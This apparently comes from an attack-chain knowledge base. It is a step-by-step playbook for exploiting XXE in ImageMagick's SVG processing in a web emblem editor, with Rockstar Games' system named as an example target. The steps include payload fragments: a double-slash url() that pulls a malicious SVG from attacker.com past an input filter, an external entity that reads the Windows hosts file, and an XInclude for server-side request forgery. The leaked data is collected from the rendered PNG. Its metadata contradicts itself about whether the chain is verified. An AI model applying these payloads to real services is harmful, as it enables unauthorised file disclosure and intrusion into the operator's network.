---
id: ac-uuid-1234
tags:
  - xxe
  - lfi
  - ssrf
  - imagemagick
  - svg
type: attack_chain
tools:
  - '[[tools/ImageMagick]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Host-Malicious-SVG-and-DTD-Files]]'
  - '[[procedures/Bypass-Regex-Filter-with-Double-Forward-Slashes]]'
  - '[[procedures/Exploit-XXE-to-Exfiltrate-Data]]'
  - '[[procedures/Alternative-Exploitation-Using-XIncludes]]'
  - '[[procedures/Render-Emblem-to-Exfiltrate-Data]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:27.550Z'
description: >-
  Multi-stage attack exploiting XXE in ImageMagick for local file inclusion and
  server-side request forgery through SVG processing in a web-based emblem
  editor.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# LFI and SSRF via XXE in ImageMagick SVG Processing

Multi-stage attack chain demonstrating exploitation of XXE vulnerability in ImageMagick's SVG processing for LFI and SSRF in a web-based emblem editor, such as Rockstar Games' system.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Host Malicious Files] --> B[Bypass Filter]
    B --> C[Exploit XXE]
    C --> D[Alternative XInclude]
    D --> E[Render and Exfil]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ImageMagick]] (target environment uses vulnerable version)
- Web server for hosting (e.g., Python's http.server)

### Target Environment

- Web platform with ImageMagick for SVG to PNG conversion
- Windows server (e.g., paths like C:/Windows/system32/drivers/etc/hosts)
- Emblem editor accepting SVG input

### Initial Access Requirements

- Access to the emblem editor interface
- Attacker-controlled server for hosting files
- No credentials needed beyond public-facing app access

## Detailed Attack Procedures

### Step 1: Host Malicious Files
procedure: [[procedures/Host-Malicious-SVG-and-DTD-Files]]

**Objective**: Prepare external SVG and DTD files containing XXE payloads to enable file reading and SSRF.

**Instructions**: Set up a web server on an attacker-controlled domain to host the malicious files. Create exfil.dtd with entity definitions for local file access and malicious.svg referencing it.

**Expected Output**: Files accessible via HTTP at http://attacker.com/exfil.dtd and http://attacker.com/malicious.svg.

**Success Indicators**:
- Files hosted and reachable
- DTD parses without errors

### Step 2: Bypass Filter
procedure: [[procedures/Bypass-Regex-Filter-with-Double-Forward-Slashes]]

**Objective**: Circumvent the input regex filter to load external SVG resources into ImageMagick processing.

**Instructions**: In the emblem editor SVG input, use a payload with double slashes like <rect fill="url(//attacker.com/malicious.svg#exploit)"> to mimic SMB paths and bypass restrictions on external URLs.

**Expected Output**: External SVG fetched and processed by ImageMagick without filter rejection.

**Success Indicators**:
- No filter block on input
- ImageMagick loads the external resource

### Step 3: Exploit XXE
procedure: [[procedures/Exploit-XXE-to-Exfiltrate-Data]]

**Objective**: Use XXE to read local files or perform SSRF, embedding the exfiltrated data in the SVG for rendering.

**Instructions**: In the hosted SVG, declare DOCTYPE with external entity from exfil.dtd, define %data for file:///C:/Windows/system32/drivers/etc/hosts, and reference &exfil; in a <text> element inside <pattern id="exploit">.

**Expected Output**: Local file content embedded in the processed SVG.

**Success Indicators**:
- Entity expansion occurs
- File content visible in rendered output

### Step 4: Alternative XInclude
procedure: [[procedures/Alternative-Exploitation-Using-XIncludes]]

**Objective**: Fetch remote HTTP content directly via XInclude as a fallback SSRF method.

**Instructions**: Embed <xi:include href="https://www.google.com/" parse="text"/> in a <text> element of the SVG to include external content.

**Expected Output**: Remote page content included in the SVG processing.

**Success Indicators**:
- XInclude processed by ImageMagick
- HTTP response embedded

### Step 5: Render and Exfil
procedure: [[procedures/Render-Emblem-to-Exfiltrate-Data]]

**Objective**: Convert the manipulated SVG to PNG, causing exfiltration of data into the rendered image for attacker retrieval.

**Instructions**: Submit the SVG to the emblem editor for PNG rendering; the exfiltrated data (file contents or HTTP responses) will appear in the image.

**Expected Output**: PNG image containing leaked data, downloadable by the attacker.

**Success Indicators**:
- PNG renders successfully
- Leaked data visible in image (e.g., hosts file text)

## Attack Chain Summary

### Key Achievements

1. Bypassed input filters to load external resources
2. Exploited XXE for LFI and SSRF
3. Exfiltrated sensitive data via rendered images

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
